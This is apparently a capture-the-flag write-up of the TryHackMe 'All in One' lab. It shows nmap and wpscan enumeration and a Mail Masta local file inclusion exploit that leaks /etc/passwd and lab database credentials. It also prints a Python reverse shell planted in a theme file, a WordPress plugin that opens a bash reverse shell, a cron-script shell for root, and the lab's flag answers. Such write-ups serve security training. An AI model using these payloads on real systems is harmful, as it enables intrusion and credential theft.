@@ -1,0 +1,442 @@
+Today we are going to solve another tryhackme challenge which is allinone listed as easy machine on thm.
+
+
+Main IP :: 10.48.159.52
+
+Starting with all port scan with nmap
+
+Nmap scan report for ip-10-48-159-52.ap-south-1.compute.internal (10.48.159.52)
+Host is up (0.00024s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Now performing service and version scan.
+
+Nmap scan report for ip-10-48-159-52.ap-south-1.compute.internal (10.48.159.52)
+Host is up, received echo-reply ttl 64 (0.00028s latency).
+Scanned at 2026-05-26 03:16:51 UTC for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.48.103.23
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 2c:97:3b:92:1d:6d:c6:3d:68:f1:3b:8b:12:1e:8d:13 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrBopnXEWAcbYDmszLOewz2K/ly9FZvLFoyeJkS+KMFWYJpyIDx63hQXVurKI+lTdDEiMpzbef9jtTusrCUK6cWMG4htuOIVx3a5WlMSUl/dDeOuUVkO8V61nDaK2I0B5GgnLvtNR4VqGxl6kRwBJr9+q+BuVxrlrihsz6u7lRqwJtH6vYjceuYZjZ7C69wByF4Wla5U3rKhVUnFcyfJyWUaPzVMUSAbD7z2g4rkYjQNY8hBdg73JQ2Tc1gdf4PzFvSSFmwFeIT75qGXngSB15pgRm3DKD6NnoT1BFmvRyxafo11SWFpncn71rW79ur9xgoWUPC8wAIENCZXHctDQEC/gB5YI0PXIThbhZXwMlAmM8aNiJ+6YAcoo9TphltgK16lG7Sv12/AE3r7vSCvkvZilPwzpsXF0kl0aEG0mDOe6tnRhWNyXhnSTYz91V6MYDfI+KzbWiAer9rjDUopeD7qGajsSTDPa2M5iWr7uXAqqCZthkVMSjrmTRqLH1O50=
+|   256 95:8c:48:05:4d:c2:05:14:f8:a6:2e:89:67:a1:5d:a6 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPb0abWSGv3u5PdXH4DvPNAtnckBIpKpZV+LO2amQKSXoSDH6Op8aZ3s/7eMCEsIU+O2gYgcrFbG0tEJmM5VTPs=
+|   256 3e:98:8e:44:ba:c7:1b:32:93:dd:92:75:5d:6e:83:c2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOk+4rOfmcm3WDYFPYWBcQq1r8n8FKlvVgeSOq79+XQE
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Also anonymous login is allowed into the ftp server we will login and get what details we can have.
+
+But not much even if the ftp is allowed let's move to port 80 
+
+so on port 80 we have nothing but apache ubuntu default webpage let's look at the source page and then move to directoy and file fuzzing.
+
+gobuster dir -u http://10.48.159.52/ -w /usr/share/wordlists/dirb/big.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.159.52/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/server-status        (Status: 403) [Size: 277]
+/wordpress  
+
+So from gobuster we find this for our own confirmation we will run a bigger file so better we know if there is hidden something
+
+so nothing after running big scan
+
+let's move to wordpress and we see a site and usernam:eelyana
+
+maybe it can help also we need to look deeper.
+
+if wordpress let's run wpscan and get more information.
+
+
+wpscan --url http://10.48.159.52/wordpress/ --force --rua
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.48.159.52/wordpress/ [10.48.159.52]
+[+] Started: Tue May 26 03:27:43 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.48.159.52/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.48.159.52/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.48.159.52/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.48.159.52/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.48.159.52/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
+ |  - http://10.48.159.52/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://10.48.159.52/wordpress/wp-content/themes/twentytwenty/
+ | Last Updated: 2026-05-20T00:00:00.000Z
+ | Readme: http://10.48.159.52/wordpress/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 3.1
+ | Style URL: http://10.48.159.52/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.48.159.52/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] mail-masta
+ | Location: http://10.48.159.52/wordpress/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2014-09-19T07:52:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.48.159.52/wordpress/wp-content/plugins/mail-masta/readme.txt
+
+[+] reflex-gallery
+ | Location: http://10.48.159.52/wordpress/wp-content/plugins/reflex-gallery/
+ | Latest Version: 3.1.7 (up to date)
+ | Last Updated: 2021-03-10T02:38:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 3.1.7 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.48.159.52/wordpress/wp-content/plugins/reflex-gallery/readme.txt
+
+ so we got the wpscan output
+ 
+ So there are multiple themes and mail masta and more 
+ 
+ i specifically targeted Mail Masta Vulnerability CVE-2016-10956 which is local file inclusion
+ 
+ (https://github.com/p0dalirius/CVE-2016-10956-mail-masta)
+ 
+ used the above exploit
+ 
+ and :~/CVE-2016-10956-mail-masta# python CVE-2016-10956_mail_masta.py -t http://10.48.159.52/wordpress/ -f /etc/passwd
+[+] Mail Masta - Local File Read (CVE-2016-10956)
+
+[+] (  2.02 kB) /etc/passwd
+root@ip-10-48-103-23:~/CVE-2016-10956-mail-masta# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+syslog:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
+uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
+tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:106:1::/var/cache/pollinate:/bin/false
+tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
+ec2-instance-connect:x:109:65534::/nonexistent:/usr/sbin/nologin
+_chrony:x:110:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+cwagent:x:999:988:Cloudwatch Agent:/home/cwagent:/sbin/nologin
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:112:113:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:997:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+systemd-oom:x:986:986:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+whoopsie:x:114:115::/nonexistent:/bin/false
+nm-openvpn:x:115:117:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+avahi:x:116:119:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+saned:x:117:120::/var/lib/saned:/usr/sbin/nologin
+colord:x:118:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+sssd:x:119:122:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+speech-dispatcher:x:120:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+cups-pk-helper:x:121:123:user for cups-pk-helper service,,,:/nonexistent:/usr/sbin/nologin
+geoclue:x:122:124::/var/lib/geoclue:/usr/sbin/nologin
+cups-browsed:x:123:123::/nonexistent:/usr/sbin/nologin
+hplip:x:124:7:HPLIP system user,,,:/run/hplip:/bin/false
+gnome-remote-desktop:x:985:985:GNOME Remote Desktop:/var/lib/gnome-remote-desktop:/usr/sbin/nologin
+dcv:x:995:984:Amazon DCV:/var/lib/dcv:/sbin/nologin
+iodine:x:127:65534::/run/iodine:/usr/sbin/nologin
+xrdp:x:128:128::/run/xrdp:/usr/sbin/nologin
+_rpc:x:129:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:130:65534::/var/lib/nfs:/usr/sbin/nologin
+msf:x:1001:1001::/home/msf:/bin/bash
+neo4j:x:994:982::/var/lib/neo4j:/bin/bash
+stunnel4:x:981:981:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
+postgres:x:131:129:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+lightdm:x:132:130:Light Display Manager:/var/lib/lightdm:/bin/false
+root
+
+and as we can see the /etc/passwd file.
+
+
+So with the above exploit we can read the files locally also there is another vulnerability which we can perform here is Reflex Gallery 3.1.7
+
+CVE-2015-4133 and with msfconsole we have it preinstalled in it
+
+sf > search CVE-2015-4133
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload
+
+this is not working in my case maybe msf error or something moving with this
+
+we know the mail masta vulnerability we directly try
+
+http://10.48.159.52/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
+
+and we get the user and creds
+
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'elyana' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'H@ckme@123' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+which are this
+
+After this we will log-in to the wordpress page and will find theme and under apperances a 404.page in which we will put our reverse shell code under exec and then after that we get the reverse shell.
+
+exec(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.48.103.23",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")')
+
+in 404.php so whenever a 404 page will occur by mistake we get the reverse shell
+
+Plugin File: revshell.php
+php
+<?php
+/**
+ * Plugin Name: Reverse Shell
+ * Plugin URI: https://example.com/
+ * Description: Instant reverse shell upon activation.
+ * Version: 1.0
+ * Author: pentester
+ */
+
+// Prevent direct access
+if ( ! defined( 'ABSPATH' ) ) {
+    exit;
+}
+
+// Send reverse shell
+$ip   = '10.48.103.23';
+$port = 4444;
+
+// Use bash /dev/tcp (most common on Ubuntu targets)
+$cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
+exec( $cmd );
+⚙️ Steps to Deploy
+Save the above code into a file named revshell.php.
+
+Zip the file:
+
+bash
+zip revshell.zip revshell.php
+Start your listener on your attack machine:
+
+bash
+nc -lvnp 4444
+In the WordPress admin panel, go to:
+
+text
+Plugins → Add New → Upload Plugin
+Choose the revshell.zip file and click Install Now.
+
+As soon as the installation completes, activate the plugin.
+The exec() line runs immediately, and you will catch a shell on your listener.
+
+
+
+on nc -lvnp 4444
+
+and we got the shell.
+
+/$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /var/backups/script.sh
+
+we see this all.
+
+www-data@ip-10-48-159-52:/$ find / -perm -4000 2> /dev/null | xargs ls -lah
+-rwsr-xr-x 1 root   root             39K Mar  7  2020 /bin/fusermount
+-rwsr-xr-x 1 root   root             55K Apr  9  2024 /bin/mount
+-rwsr-xr-x 1 root   root             67K Apr  9  2024 /bin/su
+-rwsr-xr-x 1 root   root             39K Apr  9  2024 /bin/umount
+-rwsr-xr-x 1 root   root             84K Feb  6  2024 /snap/core20/2501/usr/bin/chfn
+-rwsr-xr-x 1 root   root             52K Feb  6  2024 /snap/core20/2501/usr/bin/chsh
+-rwsr-xr-x 1 root   root             87K Feb  6  2024 /snap/core20/2501/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             55K Apr  9  2024 /snap/core20/2501/usr/bin/mount
+-rwsr-xr-x 1 root   root             44K Feb  6  2024 /snap/core20/2501/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             67K Feb  6  2024 /snap/core20/2501/usr/bin/passwd
+-rwsr-xr-x 1 root   root             67K Apr  9  2024 /snap/core20/2501/usr/bin/su
+-rwsr-xr-x 1 root   root            163K Apr  4  2023 /snap/core20/2501/usr/bin/sudo
+-rwsr-xr-x 1 root   root             39K Apr  9  2024 /snap/core20/2501/usr/bin/umount
+-rwsr-xr-- 1 root   systemd-resolve  51K Oct 25  2022 /snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            467K Jan  2  2024 /snap/core20/2501/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root            177K Jan 17  2025 /snap/snapd/23771/usr/lib/snapd/snap-confine
+-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root             84K Feb  6  2024 /usr/bin/chfn
+-rwsr-xr-x 1 root   root             52K Feb  6  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root   root             87K Feb  6  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             44K Feb  6  2024 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root             67K Feb  6  2024 /usr/bin/passwd
+-rwsr-xr-x 1 root   root             31K Feb 21  2022 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root            163K Apr  4  2023 /usr/bin/sudo
+-rwsr-xr-- 1 root   messagebus       51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root             15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root            467K Apr 11  2025 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root            156K Jan 15  2025 /usr/lib/snapd/snap-confine
+
+
+ echo "bash -i >& /dev/tcp/10.48.103.23/1338 0>&1" >> /var/backups/script.sh
+www-data@ip-10-48-159-52:/$ /bin/bash /var/backups/script.sh
+
+
+# nc -lvnp 1338
+Listening on 0.0.0.0 1338
+Connection received on 10.48.159.52 59162
+bash: cannot set terminal process group (3982): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-48-159-52:~# 
+
+
+cat /root/root.txt
+cat /root/root.txt
+VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
+root@ip-10-48-159-52:~# cat /home/elyana/user.txt
+cat /home/elyana/user.txt
+VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
